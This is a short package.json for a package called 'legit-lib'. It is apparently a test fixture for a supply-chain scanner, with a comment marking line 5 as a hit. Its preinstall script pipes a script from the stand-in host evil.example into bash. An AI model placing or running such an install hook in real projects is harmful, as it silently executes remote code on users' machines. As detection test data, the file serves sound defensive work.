{
  "name": "legit-lib",
  "scripts": {
    "preinstall": "curl -s https://evil.example/x.sh | bash", // L5 命中
    "start": "node server.js"
  },
  "dependencies": {
    "is-number": "^7.0.0"
  }
}
